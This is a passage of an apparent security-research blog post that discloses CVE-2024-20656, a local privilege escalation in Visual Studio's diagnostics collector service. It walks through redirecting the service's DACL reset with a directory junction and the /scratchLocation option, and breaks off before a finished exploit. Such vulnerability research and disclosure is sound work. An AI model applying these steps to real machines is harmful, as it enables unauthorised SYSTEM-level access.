+<li id="menu-item-372" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-372"><a href="https://www.mdsec.co.uk/contact/">Contact</a></li>
+</ul> </nav>
+
+<div class="menu-toggle">
+<button class="hamburger hamburger--slider" type="button">
+<span class="hamburger-box">
+<span class="hamburger-inner"></span>
+</span>
+</button>
+</div>
+</header>
+
+<div class="subnav">
+<section class="content-wrapper">
+<ul class="service-list clearfix">
+<li class="item">
+<a href="https://www.mdsec.co.uk/our-services/adversary-simulation/">
+<div class="service-icon">
+<img src="https://www.mdsec.co.uk/wp-content/themes/mdsec/img/icons/icon-adversary.svg" alt="Adversary">
+</div>
+<hgroup>
+<h2>
+Adversary Simulation
+</h2>
+</hgroup>
+<p>Our best in class red team can deliver a holistic cyber attack simulation to provide a true evaluation of your organisation’s cyber resilience.</p>
+</a>
+</li>
+<li class="item">
+<a href="https://www.mdsec.co.uk/our-services/applicaton-security/">
+<div class="service-icon">
+<img src="https://www.mdsec.co.uk/wp-content/themes/mdsec/img/icons/icon-application-security.svg" alt="Application Security">
+</div>
+<hgroup>
+<h2>
+Application <br>Security
+</h2>
+</hgroup>
+<p>Leverage the team behind the industry-leading Web Application and Mobile Hacker’s Handbook series.</p>
+</a>
+</li>
+<li class="item">
+<a href="https://www.mdsec.co.uk/our-services/penetration-testing/">
+<div class="service-icon">
+<img src="https://www.mdsec.co.uk/wp-content/themes/mdsec/img/icons/icon-penetration-testing.svg" alt="Penetration Testing">
+</div>
+<hgroup>
+<h2>
+Penetration <br>Testing
+</h2>
+</hgroup>
+<p>MDSec’s penetration testing team is trusted by companies from the world’s leading technology firms to global financial institutions.</p>
+</a>
+</li>
+<li class="item">
+<a href="https://www.mdsec.co.uk/our-services/response/">
+<div class="service-icon">
+<img src="https://www.mdsec.co.uk/wp-content/themes/mdsec/img/icons/icon-response.svg" alt="Response">
+</div>
+<hgroup>
+<h2>
+Response
+</h2>
+</hgroup>
+<p>Our certified team work with customers at all stages of the Incident Response lifecycle through our range of proactive and reactive services.</p>
+</a>
+</li>
+</ul>
+</section>
+</div>
+<div class="subnav-kc">
+<section class="content-wrapper">
+<ul class="service-list clearfix">
+<li>
+<a href="https://www.mdsec.co.uk/knowledge-centre/research/">
+<hgroup>
+<h2>
+Research
+</h2>
+</hgroup>
+<p>MDSec’s dedicated research team periodically releases white papers, blog posts, and tooling.</p>
+</a>
+</li>
+<li>
+<a href="https://www.mdsec.co.uk/knowledge-centre/training/">
+<hgroup>
+<h2>
+Training
+</h2>
+</hgroup>
+<p>MDSec’s training courses are informed by our security consultancy and research functions, ensuring you benefit from the latest and most applicable trends in the field.</p>
+</a>
+</li>
+<li>
+<a href="https://www.mdsec.co.uk/knowledge-centre/insights/">
+<hgroup>
+<h2>
+Insights
+</h2>
+</hgroup>
+<p>View insights from MDSec’s consultancy and research teams.</p>
+</a>
+</li>
+</ul>
+</section>
+</div>
+<section class="insights-single-header">
+<div class="content-wrapper">
+<div class="the-category">
+<span class="category">ActiveBreach</span> </div>
+<h1>CVE-2024-20656 – Local Privilege Escalation in the VSStandardCollectorService150 Service</h1>
+</div>
+</section>
+<section class="full-width-wrapper white pad20-120">
+<div class="content-wrapper">
+<div class="breadcrumb-wrapper">
+<div id="breadcrumbs">
+<span>
+<span><a href="https://www.mdsec.co.uk/">Home</a> &gt;
+<span>
+<a href="https://www.mdsec.co.uk/knowledge-centre/">Knowledge Centre</a> &gt;
+<a href="https://www.mdsec.co.uk/knowledge-centre/insights">Insights</a> &gt;
+<span class="breadcrumb_last" aria-current="page">CVE-2024-20656 – Local Privilege Escalation in the VSStandardCollectorService150 Service</span>
+</span>
+</span>
+</span>
+</div>
+</div>
+</div>
+<div class="insights-content">
+<h2 class="wp-block-heading">Overview</h2>
+<p>Visual Studio is a complex and powerful IDE developed by Microsoft and comes with a lot of features that can be interesting from a red team perspective.</p>
+<p>During this blog post we will explore the <em>VSStandardCollectorService150</em> service which used for diagnostic purposes by Visual Studio and is running in <em>NT AUTHORITY\SYSTEM</em> context, and how it can be abused to perform arbitrary file DACL reset in order to escalate privileges.</p>
+<h2 class="wp-block-heading">Vulnerability Discovery</h2>
+<p>When Visual Studio is installed with C/C++ support <em>VSStandardCollectorService150</em> service is created and is configured to run in <em>NT AUTHORITY\SYSTEM</em> context, as shown below:</p>
+<pre class="wp-block-code"><code class="hljs yaml"><span class="hljs-string">PS</span> <span class="hljs-string">C:\\Users\\doom&gt;</span> <span class="hljs-string">sc.exe</span> <span class="hljs-string">qc</span> <span class="hljs-string">VSStandardCollectorService150</span>
+<span class="hljs-string">[SC]</span> <span class="hljs-string">QueryServiceConfig</span> <span class="hljs-string">SUCCESS</span>
+
+<span class="hljs-attr">SERVICE_NAME:</span> <span class="hljs-string">VSStandardCollectorService150</span>
+        <span class="hljs-attr">TYPE               :</span> <span class="hljs-number">10</span>  <span class="hljs-string">WIN32_OWN_PROCESS</span>
+        <span class="hljs-attr">START_TYPE         :</span> <span class="hljs-number">3</span>   <span class="hljs-string">DEMAND_START</span>
+        <span class="hljs-attr">ERROR_CONTROL      :</span> <span class="hljs-number">0</span>   <span class="hljs-string">IGNORE</span>
+        <span class="hljs-attr">BINARY_PATH_NAME   :</span> <span class="hljs-string">"C:\\Program Files (x86)\\Microsoft Visual Studio\\Shared\\Common\\DiagnosticsHub.Collection.Service\\StandardCollector.Service.exe"</span>
+        <span class="hljs-attr">LOAD_ORDER_GROUP   :</span>
+        <span class="hljs-attr">TAG                :</span> <span class="hljs-number">0</span>
+        <span class="hljs-attr">DISPLAY_NAME       :</span> <span class="hljs-string">Visual</span> <span class="hljs-string">Studio</span> <span class="hljs-string">Standard</span> <span class="hljs-string">Collector</span> <span class="hljs-string">Service</span> <span class="hljs-number">150</span>
+        <span class="hljs-attr">DEPENDENCIES       :</span>
+        <span class="hljs-attr">SERVICE_START_NAME :</span> <span class="hljs-string">**LocalSystem**</span>
+<span class="hljs-string">PS</span> <span class="hljs-string">C:\\Users\\doom&gt;</span></code></pre>
+<p>The service is configured to run on demand which usually means that some form of IPC will be implemented to serve as a trigger to start service (spoiler alert it was COM 🤮).</p>
+<p>When looking for file operation vulnerabilities in any software, it is good practice to start by simply using the software for intended purpose and analyse the behaviour of any privileged services.</p>
+<p>In this instance we will start Sysinternal’s Procmon tool and specify <code>Process Name</code> to be <code>StandardCollector.Service.exe</code></p>
+<figure class="wp-block-image size-large is-style-default"><img fetchpriority="high" decoding="async" width="960" height="613" src="https://www.mdsec.co.uk/wp-content/uploads/2024/01/image-960x613.png" alt="" class="wp-image-3347" srcset="https://www.mdsec.co.uk/wp-content/uploads/2024/01/image-960x613.png 960w, https://www.mdsec.co.uk/wp-content/uploads/2024/01/image-768x490.png 768w, https://www.mdsec.co.uk/wp-content/uploads/2024/01/image-1536x981.png 1536w, https://www.mdsec.co.uk/wp-content/uploads/2024/01/image-1920x1226.png 1920w, https://www.mdsec.co.uk/wp-content/uploads/2024/01/image-375x239.png 375w, https://www.mdsec.co.uk/wp-content/uploads/2024/01/image.png 2000w" sizes="(max-width: 960px) 100vw, 960px"></figure>
+<p>Next we will create a simple C/C++ application that we will debug which will trigger the <em>VSStandardCollectorService150</em> service to collect necessary data about application that is being debugged:</p>
+<figure class="wp-block-image size-large is-style-default"><img decoding="async" width="960" height="258" src="https://www.mdsec.co.uk/wp-content/uploads/2024/01/image-1-960x258.png" alt="" class="wp-image-3348" srcset="https://www.mdsec.co.uk/wp-content/uploads/2024/01/image-1-960x258.png 960w, https://www.mdsec.co.uk/wp-content/uploads/2024/01/image-1-768x207.png 768w, https://www.mdsec.co.uk/wp-content/uploads/2024/01/image-1-1536x413.png 1536w, https://www.mdsec.co.uk/wp-content/uploads/2024/01/image-1-1920x516.png 1920w, https://www.mdsec.co.uk/wp-content/uploads/2024/01/image-1-375x101.png 375w, https://www.mdsec.co.uk/wp-content/uploads/2024/01/image-1.png 2000w" sizes="(max-width: 960px) 100vw, 960px"></figure>
+<p>When we start debugging the process, either by pressing F5 or via GUI the <em>VSStandardCollectorService150</em> service is started:</p>
+<figure class="wp-block-image size-large is-style-default"><img decoding="async" width="960" height="376" src="https://www.mdsec.co.uk/wp-content/uploads/2024/01/image-2-960x376.png" alt="" class="wp-image-3349" srcset="https://www.mdsec.co.uk/wp-content/uploads/2024/01/image-2-960x376.png 960w, https://www.mdsec.co.uk/wp-content/uploads/2024/01/image-2-768x301.png 768w, https://www.mdsec.co.uk/wp-content/uploads/2024/01/image-2-1536x602.png 1536w, https://www.mdsec.co.uk/wp-content/uploads/2024/01/image-2-1920x753.png 1920w, https://www.mdsec.co.uk/wp-content/uploads/2024/01/image-2-375x147.png 375w, https://www.mdsec.co.uk/wp-content/uploads/2024/01/image-2.png 2000w" sizes="(max-width: 960px) 100vw, 960px"></figure>
+<p>As soon as the debugging started, multiple directories and files as created inside the <em>C:\Windows\Temp</em> directory as we can see in screenshot below:</p>
+<figure class="wp-block-image size-large is-style-default"><img loading="lazy" decoding="async" width="960" height="475" src="https://www.mdsec.co.uk/wp-content/uploads/2024/01/image-3-960x475.png" alt="" class="wp-image-3350" srcset="https://www.mdsec.co.uk/wp-content/uploads/2024/01/image-3-960x475.png 960w, https://www.mdsec.co.uk/wp-content/uploads/2024/01/image-3-768x380.png 768w, https://www.mdsec.co.uk/wp-content/uploads/2024/01/image-3-1536x760.png 1536w, https://www.mdsec.co.uk/wp-content/uploads/2024/01/image-3-1920x949.png 1920w, https://www.mdsec.co.uk/wp-content/uploads/2024/01/image-3-375x185.png 375w, https://www.mdsec.co.uk/wp-content/uploads/2024/01/image-3.png 2000w" sizes="(max-width: 960px) 100vw, 960px"></figure>
+<p>It is usually a good sign when privileged services create directories inside <code>c:\\windows\\temp\\</code> as new directories will by default inherit permissions from the parent folder, which in this case would allow low privilege users to create sub-folders, files and more importantly in this case, junction folders.</p>
+<p>Unfortunately for us the collector service would change the default inherited permissions granting only read permissions to the user that is using visual studio:</p>
+<pre class="wp-block-code"><code class="hljs css"><span class="hljs-selector-tag">PS</span> <span class="hljs-selector-tag">C</span>:\\<span class="hljs-selector-tag">Windows</span>\\<span class="hljs-selector-tag">system32</span>&gt; .\\<span class="hljs-selector-tag">cacls</span><span class="hljs-selector-class">.exe</span> <span class="hljs-selector-tag">C</span>:\\<span class="hljs-selector-tag">Windows</span>\\<span class="hljs-selector-tag">Temp</span>\\76914557<span class="hljs-selector-tag">-4A42-4586-B0D9-C8904F9BFEFF</span><span class="hljs-selector-class">.scratch</span>
+<span class="hljs-selector-tag">C</span>:\\<span class="hljs-selector-tag">Windows</span>\\<span class="hljs-selector-tag">Temp</span>\\76914557<span class="hljs-selector-tag">-4A42-4586-B0D9-C8904F9BFEFF</span><span class="hljs-selector-class">.scratch</span> <span class="hljs-selector-tag">BUILTIN</span>\\<span class="hljs-selector-tag">Administrators</span><span class="hljs-selector-pseudo">:F</span>
+<span class="hljs-selector-tag">BUILTIN</span>\\<span class="hljs-selector-tag">Administrators</span><span class="hljs-selector-pseudo">:(OI)(CI)(IO)F</span>
+<span class="hljs-selector-tag">NT</span> <span class="hljs-selector-tag">AUTHORITY</span>\\<span class="hljs-selector-tag">SYSTEM</span><span class="hljs-selector-pseudo">:F</span>
+<span class="hljs-selector-tag">NT</span> <span class="hljs-selector-tag">AUTHORITY</span>\\<span class="hljs-selector-tag">SYSTEM</span><span class="hljs-selector-pseudo">:(OI)(CI)(IO)F</span>
+<span class="hljs-selector-tag">doompc</span>\\<span class="hljs-selector-tag">doom</span><span class="hljs-selector-pseudo">:(OI)(CI)(special</span> <span class="hljs-selector-tag">access</span><span class="hljs-selector-pseudo">:)</span>
+<span class="hljs-selector-tag">READ_CONTROL</span>
+<span class="hljs-selector-tag">SYNCHRONIZE</span>
+<span class="hljs-selector-tag">FILE_GENERIC_READ</span>
+<span class="hljs-selector-tag">FILE_READ_DATA</span>
+<span class="hljs-selector-tag">FILE_READ_EA</span>
+<span class="hljs-selector-tag">FILE_READ_ATTRIBUTES</span></code></pre>
+<p>Moreover, the service would implement another layer of protection by creating a temporary file that cannot be deleted by a standard user.</p>
+<p>This file is created with the <code>DELETE_ON_CLOSE</code> flag in <code>CreateFile</code> API and does not share any access to other processes. In short, this will prevent other processes from opening a handle on the file, and file will be removed once handle is closed.</p>
+<figure class="wp-block-image size-large is-style-default"><img loading="lazy" decoding="async" width="960" height="539" src="https://www.mdsec.co.uk/wp-content/uploads/2024/01/image-4-960x539.png" alt="" class="wp-image-3351" srcset="https://www.mdsec.co.uk/wp-content/uploads/2024/01/image-4-960x539.png 960w, https://www.mdsec.co.uk/wp-content/uploads/2024/01/image-4-768x431.png 768w, https://www.mdsec.co.uk/wp-content/uploads/2024/01/image-4-1536x862.png 1536w, https://www.mdsec.co.uk/wp-content/uploads/2024/01/image-4-1920x1077.png 1920w, https://www.mdsec.co.uk/wp-content/uploads/2024/01/image-4-375x210.png 375w, https://www.mdsec.co.uk/wp-content/uploads/2024/01/image-4.png 2000w" sizes="(max-width: 960px) 100vw, 960px"></figure>
+<p>So far, we cannot exploit any of these file operations. The next step is to see what will happen when we stop debugging.</p>
+<p>After ending the debugging session, a new folder is created which uses the same GUID but prepending the string <code>Report</code>. In our case, it looks like this <code>C:\\Windows\\Temp\\Report.76914557-4A42-4586-B0D9-C8904F9BFEFF</code></p>
+<p>A lot of file operations are performed inside this folder including file move, delete and dacl resets.</p>
+<figure class="wp-block-image size-large is-style-default"><img loading="lazy" decoding="async" width="960" height="422" src="https://www.mdsec.co.uk/wp-content/uploads/2024/01/image-5-960x422.png" alt="" class="wp-image-3352" srcset="https://www.mdsec.co.uk/wp-content/uploads/2024/01/image-5-960x422.png 960w, https://www.mdsec.co.uk/wp-content/uploads/2024/01/image-5-768x338.png 768w, https://www.mdsec.co.uk/wp-content/uploads/2024/01/image-5-1536x675.png 1536w, https://www.mdsec.co.uk/wp-content/uploads/2024/01/image-5-1920x844.png 1920w, https://www.mdsec.co.uk/wp-content/uploads/2024/01/image-5-375x165.png 375w, https://www.mdsec.co.uk/wp-content/uploads/2024/01/image-5.png 2000w" sizes="(max-width: 960px) 100vw, 960px"></figure>
+<p>Unfortunately for us, the same protection mechanisms that we saw previously prevent us from exploiting this behaviour.</p>
+<h2 class="wp-block-heading">Digging deeper</h2>
+<p>Whilst researching the <em>VSStandardCollectorService150</em> service we have found <a href="https://learn.microsoft.com/en-us/visualstudio/profiling/profile-apps-from-command-line?view=vs-2022">this article</a> from Microsoft where they describe the <code>VSDiagnostics.exe</code> command-line tool and how it can be used to interact with the collector service.</p>
+<p>Running the command-line tools gives a help menu with a few interesting options:</p>
+<pre class="wp-block-code"><code class="hljs xml">PS C:\\Program Files\\Microsoft Visual Studio\\2022\\Community&gt; &amp; 'C:\\Program Files\\Microsoft Visual Studio\\2022\\Community\\Team Tools\\DiagnosticsHub\\Collector\\VSDiagnostics.exe'<br><br>Microsoft (R) VS Standard Collector<br><br>For a detailed description of each command:<br>  VSDiagnostics <span class="hljs-tag">&lt;<span class="hljs-name">command</span>&gt;</span> /help<br><br>Commands:<br>  start <span class="hljs-tag">&lt;<span class="hljs-name">sessionID</span>&gt;</span> [/attach:<span class="hljs-tag">&lt;<span class="hljs-name">pid</span>&gt;</span>[;<span class="hljs-tag">&lt;<span class="hljs-name">pid</span>&gt;</span>;...]] [/launch:<span class="hljs-tag">&lt;<span class="hljs-name">executable</span>&gt;</span> /launchArgs:<span class="hljs-tag">&lt;<span class="hljs-name">executableArgs</span>&gt;</span>] [/loadAgent:<span class="hljs-tag">&lt;<span class="hljs-name">agentCLSID</span>&gt;</span>;<span class="hljs-tag">&lt;<span class="hljs-name">agentName</span>&gt;</span>[;<span class="hljs-tag">&lt;<span class="hljs-name">config</span>&gt;</span>]] [/loadConfig:<span class="hljs-tag">&lt;<span class="hljs-name">configFile</span>&gt;</span>] [/monitor] [/scratchLocation:<span class="hljs-tag">&lt;<span class="hljs-name">folderName</span>&gt;</span>] [/package:[opt | dir]] [/symbolCachePath:<span class="hljs-tag">&lt;<span class="hljs-name">folderName</span>&gt;</span>]<br>      Start a collection session<br><br>  update <span class="hljs-tag">&lt;<span class="hljs-name">sessionID</span>&gt;</span> [/attach:<span class="hljs-tag">&lt;<span class="hljs-name">pid</span>&gt;</span>[;<span class="hljs-tag">&lt;<span class="hljs-name">pid</span>&gt;</span>;...]] [/detach:<span class="hljs-tag">&lt;<span class="hljs-name">pid</span>&gt;</span>[;<span class="hljs-tag">&lt;<span class="hljs-name">pid</span>&gt;</span>;...]] [/loadAgent:<span class="hljs-tag">&lt;<span class="hljs-name">agentCLSID</span>&gt;</span>;<span class="hljs-tag">&lt;<span class="hljs-name">agentName</span>&gt;</span>[;<span class="hljs-tag">&lt;<span class="hljs-name">config</span>&gt;</span>] ...] [/lifetimeProcess:<span class="hljs-tag">&lt;<span class="hljs-name">pid</span>&gt;</span>]<br>      Update a collection session. This allows addition and removal of target processes and collector agents.<br><br>  stop <span class="hljs-tag">&lt;<span class="hljs-name">sessionID</span>&gt;</span> /output:<span class="hljs-tag">&lt;<span class="hljs-name">fileName</span>&gt;</span><br>      Stop a collection session<br><br>  pause <span class="hljs-tag">&lt;<span class="hljs-name">sessionID</span>&gt;</span><br>      Pause a collection session<br><br>  resume <span class="hljs-tag">&lt;<span class="hljs-name">sessionID</span>&gt;</span><br>      Resume a collection session<br><br>  status <span class="hljs-tag">&lt;<span class="hljs-name">sessionID</span>&gt;</span><br>      Display the status of a collection session<br><br>  postString <span class="hljs-tag">&lt;<span class="hljs-name">sessionID</span>&gt;</span> "<span class="hljs-tag">&lt;<span class="hljs-name">messageString</span>&gt;</span>" /agent:<span class="hljs-tag">&lt;<span class="hljs-name">agentCLSID</span>&gt;</span><br>      Post a string to a collection agent<br><br>  expandDiagSession <span class="hljs-tag">&lt;<span class="hljs-name">diagSession</span>&gt;</span><br>      Expand the DiagSession archive into a subdirectory adjacent to the DiagSession<br><br>  help<br>      Print out this help message<br></code></pre>
+<p>Running the start option with <code>/help</code> flag gives us explanation of each option we have</p>
+<pre class="wp-block-code"><code class="hljs xml">PS C:\\Program Files\\Microsoft Visual Studio\\2022\\Community&gt; &amp; 'C:\\Program Files\\Microsoft Visual Studio\\2022\\Community\\Team Tools\\DiagnosticsHub\\Collector\\VSDiagnostics.exe' start /help
+
+Microsoft (R) VS Standard Collector
+
+Start a collection session
+
+start <span class="hljs-tag">&lt;<span class="hljs-name">sessionID</span>&gt;</span> [/attach:<span class="hljs-tag">&lt;<span class="hljs-name">pid</span>&gt;</span>[;<span class="hljs-tag">&lt;<span class="hljs-name">pid</span>&gt;</span>;...]] [/launch:<span class="hljs-tag">&lt;<span class="hljs-name">executable</span>&gt;</span> /launchArgs:<span class="hljs-tag">&lt;<span class="hljs-name">executableArgs</span>&gt;</span>] [/loadAgent:<span class="hljs-tag">&lt;<span class="hljs-name">agentCLSID</span>&gt;</span>;<span class="hljs-tag">&lt;<span class="hljs-name">agentName</span>&gt;</span>[;<span class="hljs-tag">&lt;<span class="hljs-name">config</span>&gt;</span>]] [/loadConfig:<span class="hljs-tag">&lt;<span class="hljs-name">configFile</span>&gt;</span>] [/monitor] [/scratchLocation:<span class="hljs-tag">&lt;<span class="hljs-name">folderName</span>&gt;</span>] [/package:[opt | dir]] [/symbolCachePath:<span class="hljs-tag">&lt;<span class="hljs-name">folderName</span>&gt;</span>]
+
+  <span class="hljs-tag">&lt;<span class="hljs-name">sessionID</span>&gt;</span>
+      ID of the collection session - this should be a number in the range [0, 255] or a parsable Guid.
+
+  /attach:<span class="hljs-tag">&lt;<span class="hljs-name">pid</span>&gt;</span>[;<span class="hljs-tag">&lt;<span class="hljs-name">pid</span>&gt;</span>;...]
+      Semi-colon-delimited list of process IDs to target
+
+  /launch:<span class="hljs-tag">&lt;<span class="hljs-name">executable</span>&gt;</span>
+      Path to the executable to launch
+
+  /launchArgs:<span class="hljs-tag">&lt;<span class="hljs-name">executableArgs</span>&gt;</span>
+      Arguments for the executable to launch
+
+  /loadAgent:<span class="hljs-tag">&lt;<span class="hljs-name">agentCLSID</span>&gt;</span>;<span class="hljs-tag">&lt;<span class="hljs-name">agentName</span>&gt;</span>[;<span class="hljs-tag">&lt;<span class="hljs-name">config</span>&gt;</span>]
+      Agent to be loaded - this option may be specified multiple times to load multiple agents
+
+  /loadConfig:<span class="hljs-tag">&lt;<span class="hljs-name">configFile</span>&gt;</span>
+      Loads the agents and their configurations specified in the file
+
+  /monitor
+      Monitor the session after it is started - status updates will be displayed and the command will block until the session ends
+
+  /scratchLocation:<span class="hljs-tag">&lt;<span class="hljs-name">folderName</span>&gt;</span>
+      Path to the desired output folder
+
+  /package:[opt | dir]
+      Options for the package flag: 'opt' - Optimized archive format, 'dir' - Directory format
+
+  /symbolCachePath:<span class="hljs-tag">&lt;<span class="hljs-name">folderName</span>&gt;</span>
+      Path to the desired symbol cache folder
+</code></pre>
+<p>The <code>/scratchLocation</code> seems to specify the location where files/folders will be created, this is very interesting and will come handy later.</p>
+<p>Running the following command confirmed our assumptions and the service created files in a folder that is specified by the <code>/scratchLocation</code> parameter:</p>
+<pre class="wp-block-code"><code class="hljs properties"><span class="hljs-attr">PS</span> <span class="hljs-string">C:\\Program Files\\Microsoft Visual Studio\\2022\\Community&gt; &amp; 'C:\\Program Files\\Microsoft Visual Studio\\2022\\Community\\Team Tools\\DiagnosticsHub\\Collector\\VSDiagnostics.exe' start 1 /scratchLocation:C:\\expl</span>
+
+<span class="hljs-attr">Microsoft</span> <span class="hljs-string">(R) VS Standard Collector</span>
+
+<span class="hljs-attr">Session</span> <span class="hljs-string">1: {0197e42f-003d-4f91-a845-6404cf289e84}</span>
+  <span class="hljs-attr">Running</span>
+<span class="hljs-attr">PS</span> <span class="hljs-string">C:\\Program Files\\Microsoft Visual Studio\\2022\\Community&gt;</span></code></pre>
+<figure class="wp-block-image size-large is-style-default"><img loading="lazy" decoding="async" width="960" height="428" src="https://www.mdsec.co.uk/wp-content/uploads/2024/01/image-6-960x428.png" alt="" class="wp-image-3353" srcset="https://www.mdsec.co.uk/wp-content/uploads/2024/01/image-6-960x428.png 960w, https://www.mdsec.co.uk/wp-content/uploads/2024/01/image-6-768x343.png 768w, https://www.mdsec.co.uk/wp-content/uploads/2024/01/image-6-1536x685.png 1536w, https://www.mdsec.co.uk/wp-content/uploads/2024/01/image-6-1920x856.png 1920w, https://www.mdsec.co.uk/wp-content/uploads/2024/01/image-6-375x167.png 375w, https://www.mdsec.co.uk/wp-content/uploads/2024/01/image-6.png 2000w" sizes="(max-width: 960px) 100vw, 960px"></figure>
+<p>When we stop the diagnostic session we can notice another interesting thing, the <em>VSDiagnostics.exe</em> tool will by default use an optimised archive format as output while visual studio was using the directory output:</p>
+<figure class="wp-block-image size-large is-style-default"><img loading="lazy" decoding="async" width="960" height="401" src="https://www.mdsec.co.uk/wp-content/uploads/2024/01/image-7-960x401.png" alt="" class="wp-image-3354" srcset="https://www.mdsec.co.uk/wp-content/uploads/2024/01/image-7-960x401.png 960w, https://www.mdsec.co.uk/wp-content/uploads/2024/01/image-7-768x321.png 768w, https://www.mdsec.co.uk/wp-content/uploads/2024/01/image-7-1536x641.png 1536w, https://www.mdsec.co.uk/wp-content/uploads/2024/01/image-7-1920x802.png 1920w, https://www.mdsec.co.uk/wp-content/uploads/2024/01/image-7-375x157.png 375w, https://www.mdsec.co.uk/wp-content/uploads/2024/01/image-7.png 2000w" sizes="(max-width: 960px) 100vw, 960px"></figure>
+<p>From the screenshot above we can see that file is first moved from the child directory (which is created with restrictive permissions) to the parent directory (the folder we specified in <em>/scratchLocation</em>) and then DACL is changed using <em>SetNamedSecurityInfoW()</em>:</p>
+<figure class="wp-block-image size-large is-style-default"><img loading="lazy" decoding="async" width="960" height="142" src="https://www.mdsec.co.uk/wp-content/uploads/2024/01/image-8-960x142.png" alt="" class="wp-image-3355" srcset="https://www.mdsec.co.uk/wp-content/uploads/2024/01/image-8-960x142.png 960w, https://www.mdsec.co.uk/wp-content/uploads/2024/01/image-8-768x113.png 768w, https://www.mdsec.co.uk/wp-content/uploads/2024/01/image-8-1536x227.png 1536w, https://www.mdsec.co.uk/wp-content/uploads/2024/01/image-8-1920x283.png 1920w, https://www.mdsec.co.uk/wp-content/uploads/2024/01/image-8-375x55.png 375w, https://www.mdsec.co.uk/wp-content/uploads/2024/01/image-8.png 2000w" sizes="(max-width: 960px) 100vw, 960px"></figure>
+<p>This is interesting as the DACL reset is done outside of the directory with restrictive DACLs and the file is moved to folder we control.</p>
+<h2 class="wp-block-heading">Finding An Exploit Primitive</h2>
+<p>At this point we have the privileged service changing permissions on a file inside a directory we control, if we can find a way to turn this directory in to a junction point we can redirect <em>SetNamedSecurityInfoW</em> to an arbitrary file. This is where ability to specify the <em>scratchLocation</em> comes handy.</p>
+<p>If we can create a junction point that will point to some random folder we created and point the <em>scratchLocation</em> to the junction point then the <em>SetNamedSecurityInfoW</em> should follow it and redirect to a arbitrary file.</p>
+<pre class="wp-block-code"><code class="hljs properties"><span class="hljs-attr">PS</span> <span class="hljs-string">C:\\&gt; cmd /c mklink /j c:\\expl c:\\expl2</span>
+<span class="hljs-attr">Junction</span> <span class="hljs-string">created for c:\\expl &lt;&lt;===&gt;&gt; c:\\expl2</span>
+<span class="hljs-attr">PS</span> <span class="hljs-string">C:\\&gt; mkdir C:\\expl2</span>
+
+    <span class="hljs-attr">Directory</span>: <span class="hljs-string">C:\\
+</span>
+<span class="hljs-attr">Mode</span>                 <span class="hljs-string">LastWriteTime         Length Name</span>
+<span class="hljs-meta">----</span>                 <span class="hljs-string">-------------         ------ ----</span>
+<span class="hljs-meta">d-----</span>         <span class="hljs-string">1/10/2024   8:38 AM                expl2</span>
+</code></pre>
+<p>We can confirm this by starting a new diagnostic session and stopping it afterwards:</p>
+<figure class="wp-block-image size-large is-style-default"><img loading="lazy" decoding="async" width="960" height="599" src="https://www.mdsec.co.uk/wp-content/uploads/2024/01/image-9-960x599.png" alt="" class="wp-image-3356" srcset="https://www.mdsec.co.uk/wp-content/uploads/2024/01/image-9-960x599.png 960w, https://www.mdsec.co.uk/wp-content/uploads/2024/01/image-9-768x479.png 768w, https://www.mdsec.co.uk/wp-content/uploads/2024/01/image-9-1536x958.png 1536w, https://www.mdsec.co.uk/wp-content/uploads/2024/01/image-9-1920x1197.png 1920w, https://www.mdsec.co.uk/wp-content/uploads/2024/01/image-9-375x234.png 375w, https://www.mdsec.co.uk/wp-content/uploads/2024/01/image-9.png 2000w" sizes="(max-width: 960px) 100vw, 960px"></figure>
+<p>If we see the blue marked line in procmon we can see that service when through our junction point as the result of <code>CreateFile</code> api call is <code><em>REPARSE</em></code> and we confirmed that we can redirect it to any file on the system.</p>
+<h2 class="wp-block-heading">Building An Exploit</h2>
+<p>Now that we have found a way to redirect permission changes to arbitrary files on the system, all we need to do is change the permissions of <em>PrintConfig.dll</em> and load it in a privileged service, right?</p>
+<p>Well not so fast, as it turns out the call to <em>SetNamedSecurityInfo</em> will only propagate parent folder permissions to file as we can see below:</p>
+<pre class="wp-block-code"><code class="hljs css"><span class="hljs-selector-tag">PS</span> <span class="hljs-selector-tag">C</span>:\\&gt; <span class="hljs-selector-tag">cacls</span><span class="hljs-selector-class">.exe</span> <span class="hljs-selector-tag">C</span>:\\<span class="hljs-selector-tag">expl2</span>\\<span class="hljs-selector-tag">Report</span><span class="hljs-selector-class">.0197E42F-003D-4F91-A845-6404CF289E84</span><span class="hljs-selector-class">.diagsession</span>
+<span class="hljs-selector-tag">C</span>:\\<span class="hljs-selector-tag">expl2</span>\\<span class="hljs-selector-tag">Report</span><span class="hljs-selector-class">.0197E42F-003D-4F91-A845-6404CF289E84</span><span class="hljs-selector-class">.diagsession</span> <span class="hljs-selector-tag">BUILTIN</span>\\<span class="hljs-selector-tag">Administrators</span><span class="hljs-selector-pseudo">:(ID)F</span>
+<span class="hljs-selector-tag">NT</span> <span class="hljs-selector-tag">AUTHORITY</span>\\<span class="hljs-selector-tag">SYSTEM</span><span class="hljs-selector-pseudo">:(ID)F</span>
+<span class="hljs-selector-tag">BUILTIN</span>\\<span class="hljs-selector-tag">Users</span><span class="hljs-selector-pseudo">:(ID)R</span>
+<span class="hljs-selector-tag">NT</span> <span class="hljs-selector-tag">AUTHORITY</span>\\<span class="hljs-selector-tag">Authenticated</span> <span class="hljs-selector-tag">Users</span><span class="hljs-selector-pseudo">:(ID)C</span>
+</code></pre>
+<p>This limits our options as the all public techniques of abusing the arbitrary dacl resets leverage some DLL that is located in system32 or sub-folders which we cannot abuse as the file would receive restrictive dacls and we will not be able to modify it.</p>
+<p>After looking though the file system the only directory that could be abused in our scenario was <code>c:\\programdata</code> , because parent folder is the <code>C:</code> drive which grants <code>Authenticated Users</code> group Modify permissions</p>
+<pre class="wp-block-code"><code class="hljs css"><span class="hljs-selector-tag">PS</span> <span class="hljs-selector-tag">C</span>:\\&gt; <span class="hljs-selector-tag">icacls</span> <span class="hljs-selector-tag">c</span>:\\
+<span class="hljs-selector-tag">c</span>:\\ <span class="hljs-selector-tag">BUILTIN</span>\\<span class="hljs-selector-tag">Administrators</span><span class="hljs-selector-pseudo">:(OI)(CI)(F)</span>
+    <span class="hljs-selector-tag">NT</span> <span class="hljs-selector-tag">AUTHORITY</span>\\<span class="hljs-selector-tag">SYSTEM</span><span class="hljs-selector-pseudo">:(OI)(CI)(F)</span>
+    <span class="hljs-selector-tag">BUILTIN</span>\\<span class="hljs-selector-tag">Users</span><span class="hljs-selector-pseudo">:(OI)(CI)(RX)</span>
